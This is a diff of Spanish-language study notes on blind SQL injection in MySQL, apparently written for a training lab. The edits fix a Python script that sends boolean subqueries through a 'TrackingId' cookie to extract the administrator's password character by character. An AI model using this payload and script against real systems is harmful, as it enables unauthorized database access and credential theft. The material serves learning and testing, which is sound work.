@@ -2,7 +2,7 @@
 
 Tags: #SQLI #MySQL #BurpSuite 
 
--   **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
+-  [ExtendeClass Online](https://extendsclass.com/mysql-online.html)
 Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** o **Boolean**.
 
 ```mysql 
@@ -20,7 +20,7 @@ Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** 
 	# Datos de la columna 'username' = administrator
 ```
 
-### Conocer el usuario 
+## Conocer el usuario 
 
 ```mysql
 # Si el usuario 'administrator' existe y si su nombre empieza con la letra 'a', usando una subconsulta con 'substring()' y una comparación booleana, entonces la condición será verdadera y la consulta se ejecutará normalmente
@@ -29,7 +29,7 @@ Cuando estas en una web a ciegas, tenemos dos formas de hacerlo, por **Tiempo** 
 	# 1,1 = Hacer alución al primer caracter de la cadena (El que varia es el primer '1')
 ```
 
-### Conocer la password 
+## Conocer la password 
 
 ```mysql 
 # Conocer la longitud de la password 
@@ -74,14 +74,14 @@ def MakeSQLI():
     p2 = log.progress("Password")
 
     for position in range(1, 21):
-	    for character in characteres:
+	    for character in characters:
 		    cookies = {
-			    "TrackingID": "valor ' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
+			    "TrackingId": "valor' and (select substring(password,%d,1) from users where username='administrator')='%s' -- -" % (position, character),
 			    "session": "valor"           # El valor se obtiene de Burpsuite
 		    }
-		    p1.status(cookies['TrackingID'])
-		    r = request.get(main_url, cookies=cookies)
-		    if "Welcome back!" in r.text:  # Si el texto esta en la respuesta, colocar el caracter en passwd
+		    p1.status(cookies['TrackingId'])
+		    r = requests.get(main_url, cookies=cookies)
+		    if "Welcome back" in r.text:  # Si el texto esta en la respuesta, colocar el caracter en passwd
 			    password += character
 			    p2.status(password)
 			    break
